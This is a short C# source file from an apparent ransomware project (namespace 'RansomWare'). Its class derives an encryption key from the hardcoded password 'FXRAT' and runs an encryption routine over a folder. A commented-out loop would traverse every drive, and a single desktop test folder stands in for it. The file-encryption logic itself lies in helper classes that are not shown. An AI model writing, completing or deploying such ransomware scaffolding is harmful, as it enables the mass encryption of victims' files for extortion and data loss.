using System.Security.Cryptography;
using Lib;
namespace RansomWare;

public class HandleEncryption
{
    public HandleEncryption(Encryption encryption)
    {
        populateKeys();
        // foreach (var drive in DriveInfo.GetDrives())
        // {
        //     Util.TraverseDirectory(drive.RootDirectory, encryption);
        // }
        Util.nonIterationFolder(new DirectoryInfo(@"C:\Users\Joey\Desktop\testFolder"),
            encryption);
    }

    private void populateKeys()
    {
        using (var deriveBytes1 = new Rfc2898DeriveBytes("FXRAT", Settings.salt, 1000))
        {
            Settings.hashKey = deriveBytes1.GetBytes(32); // 256-bit key
        }
    }
}